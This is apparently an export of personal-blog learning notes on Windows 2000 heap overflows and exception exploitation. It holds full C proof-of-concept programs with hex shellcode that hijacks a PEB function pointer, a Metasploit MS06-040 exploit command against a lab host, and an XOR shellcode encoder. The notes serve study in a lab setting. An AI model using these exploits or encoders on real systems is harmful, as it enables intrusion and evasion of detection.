\u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00\u0026#34; // head of the ajacent free block \u0026#34;\\x88\\x06\\x30\\x00\u0026#34; // 0x00300688 is the address of shellcode in first // Heapblock \u0026#34;\\x30\\xFF\\x12\\x00\u0026#34;; // target of DWORD SHOOT DWORD MyExceptionhandler(void) { ExitProcess(1); return 0; } void main() { HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0, 0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); memcpy(h1, shellcode, 0x200); // over flow here, noticed 0x200 means //512 ! __asm int 3 // uesd to break the process __try { h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); } __except(MyExceptionhandler()){} } ","date":"2020-10-25T11:32:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-008-windows-exception-exploitation/","title":"Exploit Learning Notes 008 Windows Exception Exploitation"},{"content":"Disclaimer: The experimental environment is Windows 2000\nSource: Moeomu\u0026rsquo;s blog\nDisassembly of linked tables Theory Heap block allocation: \u0026ldquo;unloading\u0026rdquo; heap blocks from an empty table Block release: chaining blocks into an empty table Heap merge: \u0026ldquo;unload\u0026rdquo; several heap blocks from the empty table, modify the block header information (size), and then \u0026ldquo;chain\u0026rdquo; the new updated blocks into the empty table Heap overflow: construct the block header of the next heap overflow block, rewrite the forward and backward pointers in the block header, and then wait for an opportunity to write arbitrary data to any address in memory in sequence when the allocate-release merge operation occurs.\nThis opportunity to write arbitrary data to any location is called DWORD SHOOT/ARBITARY DWORD RESET. target load result after rewriting function return address in the stack frame shellcode start address function return, execute shellcode S.E.H handle in stack frame shellcode start address shellcode to be executed when exception occurs important function call address shellcode start address shellcode executed when function is called Practice Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;windows.h\u0026gt; int main() { HLOCAL h1, h2,h3,h4,h5,h6; HANDLE hp; hp = HeapCreate(0,0x1000,0x10000); h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); _asm int 3//used to break the process //free the odd blocks to prevent coalesing HeapFree(hp,0,h1); HeapFree(hp,0,h3); HeapFree(hp,0,h5); //now freelist[2] got 3 entries //will allocate from freelist[2] which means unlink the last entry //(h5) h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); return 0; } found At the time of h1 application to h5 space, if at this time h5 has been overflowed to cover Blink and Flink, then it will write [Flink] to [Blink] Code implantation Principle Target the PEB synchronization function pointer RtlEnterCriticalSection of the ExitProcess call, and execute the shellcode after the exception is raised by the heap overflow within the program Code Example 1 (Observe Exception) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;windows.h\u0026gt; char shellcode[]= \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00\u0026#34; \u0026#34;\\x88\\x06\\x36\\x00\u0026#34; // ShellCode起始地址 \u0026#34;\\x20\\xF0\\xFD\\x7F\u0026#34;; // PEB同步函数指针位置 int main() { HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); __asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow,0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0; } mind Just short of ShellCode content Code example 2 (incomplete) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include \u0026lt;windows.h\u0026gt; char shellcode[]= \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // 200 字节堆区结束，以下是溢出数据 \u0026#34;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00\u0026#34; // 下一个堆块的块首，保留 \u0026#34;\\x88\\x06\\x36\\x00\u0026#34; // ShellCode起始地址 \u0026#34;\\x20\\xF0\\xFD\\x7F\u0026#34;; // PEB同步函数指针位置 int main() { HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); __asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow,0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0; } Summary This time, some important parameters of the shellcode are written, but the main content is not yet written Code example 3 (problematic) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include \u0026lt;windows.h\u0026gt; char shellcode[]= \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // Do Something... \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // 200 字节堆区结束，以下是溢出数据 \u0026#34;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00\u0026#34; // 下一个堆块的块首，保留 \u0026#34;\\x88\\x06\\x36\\x00\u0026#34; // ShellCode起始地址 \u0026#34;\\x20\\xF0\\xFD\\x7F\u0026#34;; // PEB同步函数指针位置 int main() { HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); // __asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow,0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0; } Summary This is the complete ShellCode, which can successfully use the heap overflow of Win2000 But the problem is that the MessageBox cannot be popped up successfully. The reason is that the PEB pointer is spoofed together with the ShellCode, so you need to fix the PEB pointer. Code example 4 (complete) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include \u0026lt;windows.h\u0026gt; char shellcode[]= \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; //repaire the pointer which shooted by heap over run \u0026#34;\\xB8\\x20\\xF0\\xFD\\x7F\u0026#34; //MOV EAX,7FFDF020 \u0026#34;\\xBB\\x4C\\xAA\\xF8\\x77\u0026#34; //MOV EBX,77F8AA4C the address may releated to //your OS \u0026#34;\\x89\\x18\u0026#34;//MOV DWORD PTR DS:[EAX],EBX \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // 200 字节堆区结束，以下是溢出数据 \u0026#34;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00\u0026#34; // 下一个堆块的块首，保留 \u0026#34;\\x88\\x06\\x36\\x00\u0026#34; // ShellCode起始地址 \u0026#34;\\x20\\xF0\\xFD\\x7F\u0026#34;; // PEB同步函数指针位置 int main() { HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); // __asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow,0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0; } Summary This is the complete ShellCode, you can successfully use Win2000\u0026rsquo;s heap overflow to pop up MessageBox ","date":"2020-10-22T16:56:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-007-heap-overflow-exploit/","title":"Exploit Learning Notes 007 Heap Overflow Exploit"},{"content":"Disclaimer: The experimental environment is Windows 2000\nSource: Moeomu\u0026rsquo;s blog\nIntroduction to heap Difference with stack A heap is a piece of memory space requested from the operating system by the programmer using functions such as malloc. Whether it succeeds or not has a great deal to do with the state of the operating system, unlike the neatly managed stack, its management and allocation algorithm are very peculiar The heap is freed by the programmer using free or delete, while the stack is automatically freed by the system. The address range of the heap varies greatly, while the memory address of the stack is always 0x0012XXXX. Heap addresses move from low to high and stack addresses move from high to low Heap safety The heap is cluttered, so its use will be much more difficult compared to the stack, and the management of the heap has never been disclosed by Microsoft, so it is difficult to study In Windows 2000 - Windows XP SP1, heap management does not take security into account and is easy to exploit In Windows XP SP2 - Windows 2003, cookies and pointer validation at the head of the block were added. Windows Vista - Windows 7, the security, stability and efficiency of heap management have changed dramatically Heap data structures and management policies Two types of heap structures Heap blocks: The memory in the heap area is organized into blocks of different sizes, identified by heap blocks. Block head: the size of this block, whether it is occupied or not Block body: data area Heap table: Located at the beginning of the heap area, it can index all important information about the heap area, including the size, location, and occupancy or not of the heap block. The heap table is often represented by more than one data structure. In Windows, heap blocks in the occupied state are only indexed by the program that occupies them, and the heap table only indexes heap blocks in the idle state. Important heap tables in Windows. Idle bidirectional linked table: (Freelist) (Empty table) The empty table contains 128 arrays, the second array freelist[1] identifies 8 bytes of empty heap space, after which each item is incremented by 8 bytes one by one free heap block size (including heap head) = index item * 8(bytes) freelist[0] identifies all heap blocks larger than 1024 bytes (less than or equal to 512KB), which are sorted in ascending order from smallest to largest Fast one-way linked table (Lookaside) (fast table) The fast table contains 128 entries and is organized similarly to the empty table, but the single-linked table Always initialized to null, each fast table has up to 4 nodes Each node is initialized as occupied, so no heap block merging occurs Management Policy Heap Block Allocation Zero empty table allocation: chaining free blocks of different sizes in ascending order, looking for the last block in reverse from free[0], and then searching forward for the smallest free heap block that can meet the requirements for allocation Ordinary free table allocation: find the best free space allocation, followed by the next best Fast table allocation: find the table with matching size, offload it from the heap table, and return a pointer to the heap block to the program When the empty table cannot find the optimal heap block, a slightly larger block is used for allocation. This is a suboptimal allocation, where a block is first cut out from the larger block to the exact size requested for allocation, and then the remaining part is relabeled with the block header and concatenated into the empty table. The fast table is only allocated when it is an exact match, so there is no such phenomenon Heap block release Change the heap block status to free and chain to the appropriate heap table. All freed blocks will be chained to the end of the heap table, and the allocation will be taken from the end of the heap table first. Heap block merge Repeatedly requesting and releasing heap areas will create a lot of memory fragments, so in order to use memory wisely and efficiently some heap blocks will be merged This operation consists of unloading two blocks from the free table, merging the heap blocks, adjusting the block head information of the merged block, and re-chaining the new block into the free table. The heap area will also undergo a memory crunch (shrink the compact) performed by RtlCompactHeap, which will adjust the entire heap and try to merge the available pieces Heap block allocation and release strategy Small blocks (SIZE\u0026lt;1KB) Allocation Fast table allocation first, mechanical energy ordinary empty table allocation If it fails, use heap cache allocation If the heap cache allocation fails, try to allocate after memory crunch If allocation is not possible, return NULL Release Priority chaining to fast table (only 4 free blocks can be chained) If the fast table is full, chain to the corresponding empty table Large blocks (1KB\u0026lt;=SIZE\u0026lt;512KB) Allocation Allocate using heap cache If the heap cache allocation fails, use the big block in free[0] for allocation Release Put it into heap cache first If heap cache is full, chain into freelists[0] Jumbo block (SIZE\u0026gt;=512KB) Allocation: dummy allocation (not from heap area) Release: direct release, no heap table operation Practice Lesson learned in blood: whether empty or fast table, its Blink/Flink pointer points to always the Blink/Flink of the next/previous node\nTesting empty tables code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;windows.h\u0026gt; void main() { HLOCAL h1, h2, h3, h4, h5, h6; HANDLE hp; hp = HeapCreate(0, 0x1000, 0x10000); __asm int 3; h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 3); h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 5); h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 6); h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h5 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 19); h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24); //free block and prevent coaleses HeapFree(hp, 0, h1); // free to freelist[2] HeapFree(hp, 0, h3); // free to freelist[2] HeapFree(hp, 0, h5); // free to freelist[4] HeapFree(hp, 0, h4); // coalese h3 h4 h5 link the large block to freelist[8] } Watch INT exception calls up debugger, not running After HeadCreate() creates the heap area, give the heap area pointer to EAX, and observe that the address is 0x360000 at this point Check the memory area 0x360000, the information backward is (copied, I don\u0026rsquo;t know how big these structures are anyway) segment table index (SegmentList), virtual table index (VirtualAllocationList), empty table usage mark (freelist usage bitmap) and empty table index area The empty table index is found at offset 0x178, and its content is 0x00360688, which means freelist[0] points to the offset 0x688, let\u0026rsquo;s congratulate what is stored in this place This place stores 0x00360178, wonderful, it points to freelist[0], it goes around and points to itself, and this freelist[0] seems to point to the only free heap area, generally known as the \u0026ldquo;tail block\u0026rdquo; According to the structure of the heap block (below), the actual block starts at 0x00360680, and it looks like the heap block pointer crosses the heap block head and points directly to the data area 0x1-0x2 bytes is its own size, at this time the value is 0x0130, indicating that the size of the heap is 0x130 bytes The 0x3-0x4 bytes are the previous heap block size, this value is 0x08 (?????). Isn\u0026rsquo;t it said to be unique???) The 0x5 byte is the index, which is 0 at this point 0x6 byte is Flag, at this point this is 1 0x7 byte is reserved byte, which is 0 0x8 byte is the tag index (debug state), I don\u0026rsquo;t know what it does, it is 0 0x9-0xC (empty block exclusive) byte is the address of the previous empty block, it is 0x00360178 The 0xD-0x10 (empty heap block exclusive) byte is the address of the next empty heap block, again 0x00360178 runs six allocations 0x00360680-0x00360688 is the h1 block header, 0x00360689-0x0036068F is the 8 byte block body with 00 00 00 00 78 01 36 00 0x00360690-0x00360698 is the h2 block header, 0x00360699-0x0036069F is the 8-byte block body with 00 00 00 00 00 01 36 00 0x003606A0-0x003606A8 is the h3 block header, 0x003606A9-0x003606AF is the 8-byte block body with 00 00 00 00 00 00 00 36 00 0x003606B0-0x003606B8 is the h4 block header, 0x003606B9-0x003606BF is the 8-byte block body with 00 00 00 00 00 00 00 00 00 0x003606C0-0x003606C8 is the h5 block header, 0x003606C9-0x003606DF is a 24 byte block body with `00 00 00 00 00 00 00 00 00 00 00 0x003606E0-0x003606E8 is the h5 block header and 0x003606E9-0x003606FF is the 24 byte block body with 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Freeing the heap The first time the heap is freed the block size is 16 bytes, so it is connected to freeList[2], which is the location of 0x188, at this time the content is 0x00360688 The second freed heap is also connected to freeList[2], which is not described in detail The third released heap is also connected to freeList[2], which is not described in detail The fourth time it is freed, h3, h4 and h5 are adjacent to each other, so they are merged, where h3h4 is 2 heap units each and h5 is 4, so they are merged to a total of 8 heap units, excluding the heap head, they are left with 7 heap units, so they are put into freeList[8] Conclusion The information contained in the heap table is SegmentList, VirtualAllocationList, freelist usage bitmap and empty index area in that order. When a heap is just initialized, its heap block status There is only one large block in the idle state, which is called the \u0026ldquo;tail block\u0026rdquo; This is followed by the fast table Freelist[0] points to the \u0026ldquo;tail block\u0026rdquo; Each index of the region points to itself, except for the zero freelist index, which means that there are no free blocks in all the rest of the free-table First occupied block 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 struct Flag { BIT Busy; BIT ExtraPresent; BIT FillPattern; BIT VirtualAlloc; BIT LastEntry; BIT FFU1; BIT FFU2; BIT NoCoalesce; } struct BusyHeapHeadBlock // 8 Byte Head { USHORT SelfSize; USHORT PreviousChunkSize; UCHAR SegmentIndex; struct Flag Flags; UCAHR UnusedBytes; UCAHR TagIndex_Debug; } // Data After... Idle state block head 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 struct Flag { BIT Busy; BIT ExtraPresent; BIT FillPattern; BIT VirtualAlloc; BIT LastEntry; BIT FFU1; BIT FFU2; BIT NoCoalesce; } struct BusyHeapHeadBlock // 16 Byte Head { USHORT SelfSize; USHORT PreviousChunkSize; UCHAR SegmentIndex; struct Flag Flags; UCAHR UnusedBytes; UCAHR TagIndex_Debug; PVOID FlinkInFreelist; // 下一个 PVOID BlinkInFreelist; // 上一个 } // Empty Data After... Heap block allocation The size of the heap block includes the block header, so the application for 32 bytes will allocate 40 bytes. The unit of heap block is 8 bytes, less than 8 bytes are allocated according to 8 bytes, so the minimum actual allocation is 16 bytes In the initial state, the fast table and the empty table are empty, there is no exact allocation, the request will be allocated using the suboptimal block Due to the occurrence of suboptimal allocation, the allocation function will cut away some small blocks from the tail block, modify the size at the beginning of the tail block, and finally point freelist[0] to the new tail block Test the fast table code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; void main() { HLOCAL h1, h2, h3, h4; HANDLE hp; hp = HeapCreate(0, 0, 0); __asm int 3 h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16); h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24); HeapFree(hp, 0, h1); HeapFree(hp, 0, h2); HeapFree(hp, 0, h3); HeapFree(hp, 0, h4); h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16); HeapFree(hp, 0, h2); } Conclusion The block first identification bit is 0x01 Only the pointer to the next block in the stack is stored, there is no pointer to the previous block in the stack The address of freeList[0] at offset 0x178 becomes 0x00361E90 and the original 0x00360688 is occupied by the fast table The fast table starts at 0x688, each structure has a total of 0x30 bytes, and the first four bytes of content are the fast table chain Although the 0Day security book says that the 8-byte heap area is inserted as lookaside[1], it seems to me that it is the one at 0x688 that is lookaside[0], the one at 0x6B8 that is lookaside[1], and the one at 0x0E8 that can be called lookaside[2], which The size of the heap block with the block header is 16 bytes in total ","date":"2020-10-20T23:10:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-006-heap-start/","title":"Exploit Learning Notes 006 Heap Start"},{"content":"Source: Moeomu\u0026rsquo;s blog\n\u0026hellip; Unfinished business (Metasploit old version is really hard to find) \u0026hellip;\nIntrusion into Windows experiment Introduction to the experiment MS06-040, CVE-2006-3439\nRecommended Environment Remarks Attacking machine system Kali Linux 2021.1 Target host system Windows 2000 SP4 Patch version KB921883 Make sure the target host does not have the patch installed network environment can ping each other ensure no firewall interference Command line interface vulnerability testing use exploit/windows/smb/ms06_040_netapi set rhosts 10.211.55.5 exploit Make ShellCode with MetaSploit \u0026hellip; To be continued\u0026hellip;\n","date":"2020-10-20T22:20:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-005-metasploit-make-shellcode/","title":"Exploit Learning Notes 005 Metasploit Make ShellCode"},{"content":" Click here to download this article with executable program, shellcode file\nSource: Moeomu\u0026rsquo;s blog\nVariable code Caution When picking encoding byte, it can\u0026rsquo;t be the same as existing byte, otherwise there will be 0 It is possible to encode different areas with multiple different encoding bytes, but it will increase the complexity Multiple rounds of encoding of shellcode are possible Implementation code (ExpStd0401) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 void encoder(char* input, unsigned char key, int display_flag) { int i = 0, len = 0; FILE* fp; unsigned char * output; len = strlen(input); output = (unsigned char*)malloc(len + 1); if(!output) { printf(\u0026#34;memory error!\\n\u0026#34;); exit(0); } // encode shellcode for(i = 0; i \u0026lt; len; i++) { output[i] = input[i] ^ key; } if(!(fp=fopen(\u0026#34;encode.txt\u0026#34;, \u0026#34;w+\u0026#34;))) { printf(\u0026#34;output file create error!\u0026#34;); exit(0); } fprintf(fp, \u0026#34;\\\u0026#34;\u0026#34;); for(i = 0; i\u0026lt; len; i++) { fprintf(fp, \u0026#34;\\\\x%0.2x\u0026#34;, output[i]); if((i + 1 % 16 == 0)) { fprintf(fp, \u0026#34;\\\u0026#34;\\n\\\u0026#34;\u0026#34;); } } fprintf(fp, \u0026#34;\\\u0026#34;;\u0026#34;); fclose(fp); printf(\u0026#34;dump the encoded shellcode to encode.txt OK!\\n\u0026#34;); if(display_flag) { for(i = 0; i \u0026lt; len; i++) { printf(\u0026#34;%0.2x \u0026#34;, output[i]); if((i + 1) % 16 == 0) { printf(\u0026#34;\\n\u0026#34;); } } } free(output); } Decoding code (ExpStd0402) Decoder is executed jointly with shellcode Default EAX is aligned to the shellcode start position at the beginning of the shellcode The last byte of shellcode is 0x90 1 2 3 4 5 6 7 